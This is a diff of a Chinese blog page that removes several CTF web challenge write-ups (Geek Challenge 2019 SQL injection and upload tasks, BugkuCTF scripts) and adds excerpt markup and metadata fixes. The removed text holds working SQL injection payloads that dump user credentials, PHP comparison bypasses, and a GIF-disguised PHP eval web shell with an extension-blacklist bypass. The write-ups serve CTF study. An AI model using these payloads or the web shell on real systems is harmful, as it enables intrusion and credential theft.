-<h1 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h1><p>万能密码错了，看了报错应该是过滤了==or==<br><img src="https://img-blog.csdnimg.cn/2020051510482868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>双写试试能不给绕过<br><img src="https://img-blog.csdnimg.cn/20200515104848883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>简单fuzz一下，可以看到基本函数都被过滤了，不过问题不大，双写就能绕过（why？<code>str_replace()</code>函数只把关键字做了一次过滤，并未递归，例如将==seselectect==替换为==select==），注意查表时<code>information</code>里面也有个or<br><img src="https://img-blog.csdnimg.cn/20200515105726703.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查字段：<code>?username=1&#39; oorrder bbyy 4--+&amp;password=admin</code>三个<br><img src="https://img-blog.csdnimg.cn/20200515111513781.png" alt="在这里插入图片描述"><br>查回显位置：<code>?username=1&#39; ununionion seselectlect 1,2,3--+&amp;password=admin</code><br><img src="https://img-blog.csdnimg.cn/20200515111615954.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查表：<code>?username=1&#39; ununionion seselectlect 1,group_concat(table_name),3 ffromrom infoorrmation_schema.tables whwhereere table_schema=database()--+&amp;password=admin</code><br><img src="https://img-blog.csdnimg.cn/20200515111848684.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查列：<code>?username=1&#39; ununionion seselectlect 1,group_concat(column_name),3 ffromrom infoorrmation_schema.columns whwhereere table_name=&quot;b4bsql&quot;--+&amp;password=admin</code><br><img src="https://img-blog.csdnimg.cn/20200515111947729.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查字段：很尴尬，password里面也有个or忘了双写哈哈<br><img src="https://img-blog.csdnimg.cn/20200515112130783.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>最终payload：<code>?username=1&#39; ununionion seselectlect 1,group_concat(id,&quot;:&quot;,username,&quot;:&quot;,passwoorrd),3 ffromrom b4bsql--+&amp;password=admin</code><br><img src="https://img-blog.csdnimg.cn/20200515112209804.png" alt="在这里插入图片描述"></p>
-<hr>
-<h1 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h1><p>漂亮的主页要我去买flag，拒绝py，看源码有==pay.php==，好贵，而且只有CUIT的学生才可以买，还要密码，看看源码发现这个<br><img src="https://img-blog.csdnimg.cn/2020051511262696.png" alt="在这里插入图片描述"><br>基础知识，绕过is_numeric，后面加空格/%00。<a target="_blank" rel="noopener" href="https://www.cnblogs.com/gh-d/p/8085676.html">参考博客</a>，<br>直接输密码应该不对，因为我们还不是CUIT的学生，抓包看看吧<br><img src="https://img-blog.csdnimg.cn/20200515113007758.png" alt="在这里插入图片描述"><br>cookie可疑，改成1试试<br><img src="https://img-blog.csdnimg.cn/20200515113035735.png" alt="在这里插入图片描述"><br>可以输passwd了，<code>password=404%20</code>，记在bp里把请求方式改为==POST==，并加上==Content-Type: application/x-www-form-urlencoded==它用于指示资源的MIME类型<br><img src="https://img-blog.csdnimg.cn/20200515113524981.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>盲猜传一个money参数<br><img src="https://img-blog.csdnimg.cn/2020051511363089.png" alt="在这里插入图片描述"><br>猜测正确，但是本题采用php5.3版本，此版本不能接受八位长的数字，所以两种办法</p>
-<ul>
-<li>第一、用科学计数法<br><img src="https://img-blog.csdnimg.cn/20200515114023840.png" alt="在这里插入图片描述"><ul>
-<li>第二、猜测后端用的<code>strcmp()</code>函数比较的钱数<br>  了解strcmp：<pre><code>  ==int strcmp ( string $str1 , string $str2 )==
-  参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。
-  此函数在php 5.2版本之前，利用strcmp函数将数组与字符串进行比较会返回-1，但是从5.3开始，会返回0
-  [参考博客](https://www.jianshu.com/p/d91c3357b4d3)</code></pre>
-所以我们用数组绕过也行<br><img src="https://img-blog.csdnimg.cn/20200515114519493.png" alt="在这里插入图片描述"></li>
-</ul>
-</li>
-</ul>
-<hr>
-<h1 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h1><p>先传个🐎试试，shell.php的一句话，提示<img src="https://img-blog.csdnimg.cn/20200515115046489.png" alt="在这里插入图片描述"><br>后缀改为jpg试试<br><img src="https://img-blog.csdnimg.cn/20200515115129364.png" alt="在这里插入图片描述"><br>可能是检测文件头内容，用GIF淦，一句话如下</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a? </span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="built_in">eval</span>($_REQUEST[shell])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>写到笔记本里。后缀改为gif上传，bp抓包改为php（apache解析，改为gif连不上马儿），发现黑名单了，换个姿势，用==php3、php5、pht、phtml、phpt==，最终还是用了phtml<br><img src="https://img-blog.csdnimg.cn/20200515120456144.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200515120648394.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200515120701701.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>没给路径，一般在 ==/upload/文件名==里面，试一下，果然（大胆猜测，小心证明）<br><img src="https://img-blog.csdnimg.cn/20200515120729731.png" alt="在这里插入图片描述"><br>autsword或者菜刀连接，文件太多了，用终端找flag，<code> find / -name flag</code><br><img src="https://img-blog.csdnimg.cn/20200515121002262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<hr>
-<h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><p>还是那个登陆页面，万能密码被逮住了，正常注入不行，双写不可，看看有没有报错注入，过滤了空格 等号 大于号小于号，like代替等号 用括号括起来就可以无空格<img src="https://img-blog.csdnimg.cn/20200515121145220.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>一开始用<code>--+</code>没能把后面的语句注释掉，换成<code>%23</code><br><img src="https://img-blog.csdnimg.cn/20200517085135315.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查表<code>?username=admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&amp;password=123</code><br><img src="https://img-blog.csdnimg.cn/20200517085159939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查列<code>?username=admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e),1))%23&amp;password=123</code><br><img src="https://img-blog.csdnimg.cn/20200517085259570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查字段<code>?username=admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(id,&quot;:&quot;,username,&quot;:&quot;,password))from(H4rDsq1)),0x7e),1))%23&amp;password=123</code><br><img src="https://img-blog.csdnimg.cn/20200517085539894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>因updatexml回显最多32位，所以可以用==left和right==拼接出来<br><code>?username=admin&#39;or(updatexml(1,concat(0x7e,(select(left(password,32))from(H4rDsq1)),0x7e),1))%23&amp;password=123</code><br><code>?username=admin&#39;or(updatexml(1,concat(0x7e,(select(right(password,22))from(H4rDsq1)),0x7e),1))%23&amp;password=123</code><br><img src="https://img-blog.csdnimg.cn/20200517085750587.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020051709002757.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>只有报错才行吗？当然不，试了试盲注，虽然<code>&gt;&lt;</code>被ban了但是还有<code>like</code>鸭，淦<br>查数据库<code>?username=admin&#39;or(left((database()),1)like&#39;g&#39;)%23&amp;password=123</code><br><img src="https://img-blog.csdnimg.cn/20200517090425527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查表<code>?username=admin&#39;or(left((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),1)like&#39;H&#39;)%23&amp;password=123</code><br><img src="https://img-blog.csdnimg.cn/20200517092111553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>写个脚本或者bp自动化爆破一下就行，我先挖个坑，不一定填哈哈哈</p>
-<hr>
-<h1 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h1><p>五个选项都没啥用，fuzz一下，过滤了不少东西<br><img src="https://img-blog.csdnimg.cn/20200517101701266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h1 id="暂更"><a href="#暂更" class="headerlink" title="暂更"></a>暂更</h1>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/3F518AW/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1114,7 +884,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2019/undefined/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2019/1RE8ZEW/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/xiaoxin.jpg">
@@ -1128,7 +898,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2019/undefined/" class="post-title-link" itemprop="url">BugkuCTF-web-速度要快 writeup</a>
+            <a href="/2019/1RE8ZEW/" class="post-title-link" itemprop="url">BugkuCTF-web-速度要快 writeup</a>
         </h2>
 
         <div class="post-meta">
@@ -1145,7 +915,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-09-28 22:07:26" itemprop="dateModified" datetime="2020-09-28T22:07:26+08:00">2020-09-28</time>
+                <time title="修改时间：2020-09-30 09:29:45" itemprop="dateModified" datetime="2020-09-30T09:29:45+08:00">2020-09-30</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1163,14 +933,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span></span>
+              <span>2.6k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>NaN:aN</span>
+              <span>4 分钟</span>
             </span>
 
         </div>
@@ -1182,30 +952,17 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <a id="more"></a>
-
-<hr>
+          <blockquote>
 <p>脚本能力+0.001<br>POST快速反弹<br>另：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43578492/article/details/101701339">bugku 秋名山车神</a></p>
-<hr>
-<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p><a target="_blank" rel="noopener" href="http://123.206.87.240:8002/web6/">题目</a><br><img src="https://img-blog.csdnimg.cn/20190929175744255.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<hr>
-<p>看看源码，让我们POST一个参数：<code>margin</code><br><img src="https://img-blog.csdnimg.cn/20190929175929868.png" alt="在这里插入图片描述"><br>提交啥内容呢？看看响应头<br><img src="https://img-blog.csdnimg.cn/20190929180043644.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>flag是个base64，解码，发现还是一个base64，自己做题时多试几遍才会知道<br><img src="https://img-blog.csdnimg.cn/20190929180727826.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再次解码，hackbar提交试试<br><img src="https://img-blog.csdnimg.cn/20190929180812489.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>那就上脚本呗，不过在试flag时发现每次刷新都会产生新的flag，所以要用==session==对象会话保持同一个flag</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests	//引入requests库</span><br><span class="line"><span class="keyword">import</span> base64	//引入base64库</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;&#x27;&#x27;http://123.206.87.240:8002/web6/&#x27;&#x27;&#x27;</span></span><br><span class="line">s = requests.session()	//保持会话</span><br><span class="line">hader = s.get(url).headers	//提取响应头的flag参数</span><br><span class="line">key = base64.b64decode(base64.b64decode(hader[<span class="string">&#x27;flag&#x27;</span>]).decode().split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>])	//两次base64解码，split以冒号分隔并提取第二个字符串</span><br><span class="line">post = &#123;<span class="string">&#x27;margin&#x27;</span>:key&#125;</span><br><span class="line">print(s.post(url, post).text)</span><br></pre></td></tr></table></figure>
-<ul>
-<li>为什么第七行还要用一次decode()？</li>
-<li>因为b64encode和b64decode接收参数为bytes或ascii码字符串，返回值为bytes。不用一次decode会导致输出时为<code>b&#39;xxx&#39;</code><br>  字符串和bytes互相转换有encode和decode方法，默认编码为utf-8。<br>提交得到flag<br><img src="https://img-blog.csdnimg.cn/20190929182207991.png" alt="在这里插入图片描述"></li>
-</ul>
-<hr>
-<h3 id="骚思路"><a href="#骚思路" class="headerlink" title="骚思路"></a>骚思路</h3><p>既然每次返回头的flag都不一样，那么它cookie也不一样喽，看看haders吧</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;&#x27;&#x27;http://123.206.87.240:8002/web6/&#x27;&#x27;&#x27;</span></span><br><span class="line">get_response = requests.get(url)</span><br><span class="line">print(<span class="string">&quot;GET request headers:\n&quot;</span>, get_response.request.headers)</span><br><span class="line">print(<span class="string">&quot;GET response headers:\n&quot;</span>, get_response.headers)</span><br><span class="line"></span><br><span class="line">key = base64.b64decode(base64.b64decode(get_response.headers[<span class="string">&#x27;flag&#x27;</span>]).decode().split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">post = &#123;<span class="string">&#x27;margin&#x27;</span>:key&#125;</span><br><span class="line">post_response = requests.post(url, data = post)</span><br><span class="line">print(<span class="string">&quot;POST request headers:\n&quot;</span>, post_response.request.headers)</span><br><span class="line">print(<span class="string">&quot;POST response headers:\n&quot;</span>, post_response.headers)</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20190929201638594.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到cookies并不一样，所以我们在提交post的时候再加上一个cookie的值就好啦，但事实真的是这样吗？我们看看加了session会话后的headers是什么样的</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;&#x27;&#x27;http://123.206.87.240:8002/web6/&#x27;&#x27;&#x27;</span></span><br><span class="line">s = requests.session()</span><br><span class="line">get_response = s.get(url)</span><br><span class="line">print(<span class="string">&quot;GET request headers:\n&quot;</span>, get_response.request.headers)</span><br><span class="line">print(<span class="string">&quot;GET response headers:\n&quot;</span>, get_response.headers)</span><br><span class="line"></span><br><span class="line">key = base64.b64decode(base64.b64decode(get_response.headers[<span class="string">&#x27;flag&#x27;</span>]).decode().split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">post = &#123;<span class="string">&#x27;margin&#x27;</span>:key&#125;</span><br><span class="line">post_response = s.post(url, data = post)</span><br><span class="line">print(<span class="string">&quot;POST request headers:\n&quot;</span>, post_response.request.headers)</span><br><span class="line">print(<span class="string">&quot;POST response headers:\n&quot;</span>, post_response.headers)</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20190929202950511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>确实，加了session的会话后在post的请求头上确实加上了同一个cookie<br>那么上最终脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;&#x27;&#x27;http://123.206.87.240:8002/web6/&#x27;&#x27;&#x27;</span></span><br><span class="line">header = requests.get(url).headers</span><br><span class="line"></span><br><span class="line">key = base64.b64decode(base64.b64decode(header[<span class="string">&#x27;flag&#x27;</span>]).decode().split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">phpsessid = header[<span class="string">&#x27;Set-Cookie&#x27;</span>].split(<span class="string">&#x27;;&#x27;</span>)[<span class="number">0</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">post = &#123;<span class="string">&#x27;margin&#x27;</span>:key&#125;</span><br><span class="line">cookie = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:phpsessid&#125;</span><br><span class="line">print(requests.post(url, data = post, cookies = cookie).text)</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20190929210241126.png" alt="在这里插入图片描述"></p>
-<hr>
-<p><a target="_blank" rel="noopener" href="https://ciphersaw.me/2017/12/16/%E8%AF%A6%E8%A7%A3%20CTF%20Web%20%E4%B8%AD%E7%9A%84%E5%BF%AB%E9%80%9F%E5%8F%8D%E5%BC%B9%20POST%20%E8%AF%B7%E6%B1%82/">参考博客</a></p>
-
+</blockquote>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2019/1RE8ZEW/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1224,7 +981,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2019/undefined/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2019/C7SS0W/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/xiaoxin.jpg">
@@ -1238,7 +995,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2019/undefined/" class="post-title-link" itemprop="url">BugkuCTF-web-秋名山车神 writeup</a>
+            <a href="/2019/C7SS0W/" class="post-title-link" itemprop="url">BugkuCTF-web-秋名山车神 writeup</a>
         </h2>
 
         <div class="post-meta">
@@ -1255,7 +1012,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-09-28 22:07:25" itemprop="dateModified" datetime="2020-09-28T22:07:25+08:00">2020-09-28</time>
+                <time title="修改时间：2020-09-30 09:29:04" itemprop="dateModified" datetime="2020-09-30T09:29:04+08:00">2020-09-30</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1273,14 +1030,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span></span>
+              <span>840</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>NaN:aN</span>
+              <span>1 分钟</span>
             </span>
 
         </div>
@@ -1292,23 +1049,131 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <a id="more"></a>
-
-<hr>
+          <blockquote>
 <p>脚本能力+0.001<br>快速反弹POST请求<br>另：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43578492/article/details/101705708">bugku 速度要快</a></p>
-<hr>
-<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p><a target="_blank" rel="noopener" href="http://123.206.87.240:8002/qiumingshan/">题目链接</a><br><img src="https://img-blog.csdnimg.cn/20190929170225778.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>本题考验脚本能力，手动提交？哼，不存在的<br>题目多次刷新，出现要提交的参数：<code>value</code><br><img src="https://img-blog.csdnimg.cn/20190929170443382.png" alt="在这里插入图片描述"><br>这么长的数字计算器算都可能溢出，所以上脚本，本题采用正则表达式，如果不熟悉这个可以先看看教程：<a target="_blank" rel="noopener" href="https://www.runoob.com/regexp/regexp-tutorial.html">正则教程</a></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests //引入request库</span><br><span class="line"><span class="keyword">import</span> re 		//引入re库</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;&#x27;&#x27;http://123.206.87.240:8002/qiumingshan/&#x27;&#x27;&#x27;</span></span><br><span class="line">s = requests.session()  //用session会话保持表达式是同一个</span><br><span class="line">retuen = s.get(url)</span><br><span class="line">equation = re.search(<span class="string">r&#x27;(\d+[+\-*])+(\d+)&#x27;</span>, retuen.text).group()</span><br><span class="line"></span><br><span class="line">result = eval(equation)	//eval() 函数用来执行一个字符串表达式，并返回表达式的值。</span><br><span class="line">key = &#123;<span class="string">&#x27;value&#x27;</span>:result&#125;</span><br><span class="line">print(s.post(url, data = key).text)</span><br></pre></td></tr></table></figure>
-<p>这个脚本重点还是第7行的==正则==，解释下</p>
-<ul>
-<li><code>re.search()</code>表示从文本的第一个字符匹配到最后一个，其第一个参数为正则表达式，第二个参数是要匹配的文本</li>
-<li><code>r&#39;&#39;</code>表示内容为原生字符串，防止被转义</li>
-<li><code>(\d+[+\-*])+(\d+)</code>：==\d+== 表示匹配一个或多个数字；==[+-<em>]== 表示匹配一个加号或一个减号或一个乘号（注：减号在中括号内是特殊字符，要用反斜杠转义）；所以 ==(\d+[+-</em>])+== 表示匹配多个数字和运算符组成的“表达式”；最后再加上一组数字 ==(\d+)== 即可</li>
-<li><code>group()</code>返回字符串</li>
-</ul>
